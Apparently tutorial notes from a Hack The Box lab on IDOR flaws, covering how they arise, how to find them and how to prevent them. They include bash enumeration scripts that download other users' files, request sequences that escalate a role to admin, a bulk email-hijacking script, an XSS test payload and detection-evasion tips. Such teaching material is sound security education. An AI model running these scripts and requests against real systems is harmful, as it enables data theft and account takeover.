# Insecure Direct Object References (IDOR)

## Introduction
IDOR vulnerabilities are among the most common web vulnerabilities that can significantly impact vulnerable web applications. They occur when a web application exposes a direct reference to an object (like a file or database resource) that end-users can control to access other similar objects. A system is considered vulnerable if any user can access any resource due to inadequate access control mechanisms.

## Why IDOR Vulnerabilities Occur
- Building solid access control systems is challenging
- Automated vulnerability detection is difficult
- Many developers overlook proper back-end access control
- Front-end restrictions alone are insufficient

## Example Scenario
Consider a file download system:
- User uploads a file and gets a link: `download.php?file_id=123`
- Without proper access control, requesting `download.php?file_id=124` might expose other users' files
- Easily guessable IDs make the vulnerability more exploitable

## What Makes an IDOR Vulnerability
1. **Direct Reference Exposure**
   - Merely exposing direct references isn't the vulnerability
   - The vulnerability stems from weak access control systems

2. **Lack of Back-end Validation**
   - Many applications only restrict access at the UI level
   - Missing back-end authentication checks
   - No Role-Based Access Control (RBAC)

## Impact of IDOR Vulnerabilities

### Information Disclosure
- Accessing private files and resources
- Viewing other users' personal data
- Exposure of sensitive information (e.g., credit card data)

### Data Manipulation
- Modification of other users' data
- Potential account takeover
- Deletion of unauthorized resources

### Privilege Escalation
- Elevation from standard user to administrator
- Unauthorized access to admin functions
- Potential for complete application takeover through:
  - Password changes
  - Role modifications
  - Administrative operations

## Common Attack Patterns
- Manipulating URL parameters
- Modifying API endpoints
- Testing sequential or predictable IDs
- Exploiting exposed admin functions in front-end code

## Prevention Best Practices
1. Implement robust back-end access control
2. Use unpredictable object references
3. Validate user permissions for every request
4. Implement proper Role-Based Access Control (RBAC)
5. Never rely solely on front-end restrictions

## Identifying IDOR Vulnerabilities

### 1. URL Parameters & APIs
- Look for object references in:
  - URL parameters (e.g., `?uid=1`, `?filename=file_1.pdf`)
  - API endpoints
  - HTTP headers
  - Cookies
- Test by incrementing values: `?uid=2`, `?filename=file_2.pdf`
- Use fuzzing tools to test multiple variations

### 2. AJAX Calls in Frontend Code
JavaScript frameworks may expose all function calls in frontend code. Example:

```javascript
function changeUserPassword() {
    $.ajax({
        url: "change_password.php",
        type: "post",
        dataType: "json",
        data: {
            uid: user.uid,
            password: user.password,
            is_admin: is_admin
        },
        success: function(result) {
            //
        }
    });
}
```

### 3. Encoded/Hashed References
#### Base64 Encoding Example
- Encoded: `?filename=ZmlsZV8xMjMucGRm`
- Decoded: `file_123.pdf`
- Test: Encode `file_124.pdf` → `ZmlsZV8xMjQucGRm`

#### Hash-based References
```javascript
$.ajax({
    url: "download.php",
    type: "post",
    dataType: "json",
    data: {
        filename: CryptoJS.MD5('file_1.pdf').toString()
    },
    success: function(result) {
        //
    }
});
```

### 4. User Role Comparison
Example API call for salary information:
```json
{
  "attributes": {
    "type": "salary",
    "url": "/services/data/salaries/users/1"
  },
  "Id": "1",
  "Name": "User1"
}
```

#### Testing Methodology
1. Register multiple test accounts
2. Compare HTTP requests and object references
3. Analyze parameter calculation patterns
4. Test cross-account access by replicating requests
5. Look for missing backend access controls

### Common Testing Patterns
1. Increment numeric IDs
2. Decode encoded parameters
3. Identify and replicate hash patterns
4. Copy API calls across different user roles
5. Test admin endpoints with non-admin accounts

## Mass IDOR Enumeration

### Basic Parameter Analysis
1. **Example Web Application Structure**
```
http://server/documents.php?uid=1
├── Documents/
│   ├── Invoice_1_09_2021.pdf
│   └── Report_1_10_2021.pdf
```

2. **Common Parameter Patterns**
- Direct ID references: `?uid=1`
- Filter parameters: `uid_filter=1`
- Predictable file patterns: `Invoice_[USER_ID]_[MONTH]_[YEAR].pdf`

### Identifying Vulnerable Parameters

#### Static File IDOR
```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```
- Look for predictable naming patterns
- Check file naming conventions
- Identify user ID placement in names

#### Dynamic Parameter IDOR
```
http://server/documents.php?uid=2
```
- Test parameter modifications
- Monitor page size changes
- Check source code differences
- Verify file content changes

### Automated Enumeration Techniques

#### 1. HTML Source Analysis
```html
<li class='pure-tree_link'>
    <a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a>
</li>
<li class='pure-tree_link'>
    <a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a>
</li>
```

#### 2. Command-line Enumeration
```bash
# Basic link extraction
curl -s "http://server/documents.php?uid=3" | grep "<li class='pure-tree_link'>"

# Advanced pattern matching
curl -s "http://server/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

#### 3. Automation Script
```bash
#!/bin/bash

url="http://server"

for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q $url/$link
    done
done
```

### Mass Enumeration Tools
1. **Automated Tools**
   - Burp Intruder
   - OWASP ZAP Fuzzer
   - Custom scripts (Bash/PowerShell)

2. **Best Practices**
   - Use unique identifiers for pattern matching
   - Implement rate limiting in scripts
   - Monitor response sizes
   - Log failed attempts
   - Verify downloaded content

3. **Detection Avoidance**
   - Add delays between requests
   - Randomize user-agent strings
   - Use session rotation
   - Implement error handling 

## IDOR in Insecure APIs

### Identifying Insecure API Endpoints
- Look for API endpoints that update or modify user data, e.g.:
  ```
  PUT /profile/api.php/profile/1
  ```
- Intercept requests and examine JSON payloads for user-controllable fields:
  ```json
  {
      "uid": 1,
      "uuid": "40f5888b67c748df7efba008e7c2f9d2",
      "role": "employee",
      "full_name": "Amy Lindon",
      "email": "a_lindon@employees.htbl",
      "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
  }
  ```
- Check for client-side controlled roles or privileges (e.g., `role=employee` in cookies or JSON).

### Exploitation Techniques
1. **Change UID to Another User**
   - Modify `"uid"` in the JSON and/or the API endpoint:
     ```
     PUT /profile/api.php/profile/2
     {
         "uid": 2,
         ...
     }
     ```
   - Observe for errors like `uid mismatch` or `uuid mismatch`.

2. **Privilege Escalation via Role Manipulation**
   - Attempt to set `"role": "admin"` or similar:
     ```json
     {
         "role": "admin"
     }
     ```
   - Check for errors like `Invalid role`.

3. **Unauthorized User Creation/Deletion**
   - Try POST/DELETE requests to the API:
     ```
     POST /profile/api.php
     DELETE /profile/api.php/profile/2
     ```
   - Look for authorization errors (e.g., `Creating new employees is for admins only`).

4. **Information Disclosure via GET**
   - Attempt to retrieve other users' data:
     ```
     GET /profile/api.php/profile/2
     ```
   - If successful, use leaked data for further attacks.

### Key Points
- Always test both function calls (PUT/POST/DELETE) and information disclosure (GET).
- Pay attention to error messages (`uid mismatch`, `uuid mismatch`, `Invalid role`).
- Look for client-side controlled parameters that should be validated server-side.
- Use information disclosure vulnerabilities to aid in function call exploitation.

---

## Chaining IDOR Vulnerabilities

### 1. Information Disclosure via GET
- Send GET requests to enumerate user details:
  ```
  GET /profile/api.php/profile/2
  Cookie: role=employee
  ```
- Example response:
  ```json
  {
      "uid": "2",
      "uuid": "4a9bd19b3b8676199592a346051f950c",
      "role": "employee",
      "full_name": "Iona Franklyn",
      "email": "i_franklyn@employees.htb",
      "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
  }
  ```

### 2. Modifying Other Users' Details
- Use leaked `uuid` to update another user:
  ```
  PUT /profile/api.php/profile/2
  Content-Type: application/json
  Cookie: role=employee
  ```
  ```json
  {
      "uid": "2",
      "uuid": "4a9bd19b3b8676199592a346051f950c",
      "role": "employee",
      "full_name": "Hacked User",
      "email": "attacker@evil.com",
      "about": "<script>alert(1)</script>"
  }
  ```

### 3. Privilege Escalation
- Enumerate users to find an admin:
  ```json
  {
      "uid": "X",
      "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
      "role": "web_admin",
      "full_name": "administrator",
      "email": "webadmin@employees.htb",
      "about": "HTB{FLAG}"
  }
  ```
- Set your own role to `web_admin`:
  ```
  PUT /profile/api.php/profile/1
  ```
  ```json
  {
      "uid": "1",
      "uuid": "40f5888b67c748df7efba008e7c2f9d2",
      "role": "web_admin",
      "full_name": "Amy Lindon",
      "email": "a_lindon@employees.htb",
      "about": "..."
  }
  ```
- Update your cookie:
  ```
  Cookie: role=web_admin
  ```

### 4. Creating a New User as Admin
- Create a new user:
  ```
  POST /profile/api.php
  Cookie: role=web_admin
  ```
  ```json
  {
      "uid": "NEW",
      "uuid": "SOME_UUID",
      "role": "employee",
      "full_name": "New User",
      "email": "newuser@evil.com",
      "about": "..."
  }
  ```

### 5. Mass Assignment Example
- Change all users' emails:
  ```bash
  #!/bin/bash
  url="http://server/profile/api.php"
  for uid in {1..N}; do
      uuid=$(curl -s "$url/profile/$uid" | jq -r '.uuid')
      curl -X PUT -H "Content-Type: application/json" -b "role=web_admin" \
        -d "{\"uid\":\"$uid\",\"uuid\":\"$uuid\",\"role\":\"employee\",\"full_name\":\"User$uid\",\"email\":\"attacker@evil.com\",\"about\":\"...\"}" \
        "$url/profile/$uid"
  done
  ```

---

## IDOR Prevention

### 1. Object-Level Access Control (RBAC)
- Enforce access control on the back-end for every object/resource.
- Use Role-Based Access Control (RBAC) to map user roles to object permissions.
- Example (pseudo-code / security rules):
  ```javascript
  match /api/profile/{userId} {
      allow read, write: if user.isAuth == true
      && (user.uid == userId || user.roles == 'admin');
  }
  ```
- Never trust user-controlled data (e.g., roles in cookies or request bodies).
- Always validate permissions server-side using session tokens or secure authentication.

### 2. Secure Object Referencing
- Avoid predictable or sequential object references (e.g., `uid=1`).
- Use strong, unique identifiers (e.g., UUIDv4) for object references.
- Example (PHP):
  ```php
  $uuid = $_REQUEST['uuid'];
  $query = "SELECT url FROM documents WHERE uuid='" . mysqli_real_escape_string($conn, $uuid) . "'";
  $result = mysqli_query($conn, $query);
  $row = mysqli_fetch_array($result);
  echo "<a href='" . htmlspecialchars($row['url']) . "' target='_blank'></a>";
  ```
- Generate and store UUIDs server-side when objects are created.
- Never generate or calculate hashes/IDs on the client side.

### 3. Key Takeaways
- Implement robust, centralized access control for every object.
- Use unpredictable, securely generated references for all sensitive resources.
- Always validate user permissions on the server, not the client.
- Even with strong references, broken access control can still lead to IDOR. 